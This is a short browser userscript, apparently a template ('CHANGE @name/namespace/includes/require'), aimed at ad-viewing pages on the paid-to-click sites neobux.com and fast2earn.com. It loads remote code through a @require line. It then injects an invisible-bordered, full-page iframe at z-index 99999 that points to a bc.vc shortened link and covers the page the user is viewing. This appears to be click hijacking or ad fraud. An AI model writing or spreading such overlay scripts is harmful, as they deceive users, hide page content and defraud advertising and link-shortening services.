
ï»¿
CHANGE @name/namespace/includes/require

// ==UserScript==
// @name        neobux
// @namespace   neobux
// @include     *://*neobux.com/m/v/?vl=*
// @include     *://*neobux.com/v/?a*
// @include     *://*neobux.com/v/?xc*
// @require     http://userscripts.org/users/505303
// @include     *://*.*cks.com/
// @include     *://*fast2earn.com*
// @version     1
// ==/UserScript==
//

var el = document.createElement("iframe");
el.setAttribute('id', 'ifrm');
document.body.appendChild(el);
el.setAttribute('src', 'http://bc.vc/AiSGZS');
el.setAttribute('style', 'border:0px;z-index:99999;position:absolute;top:0px;left:0px;');
el.setAttribute('width', '100%');
el.setAttribute('height', '9999px');
el.setAttribute('scrolling', 'no');
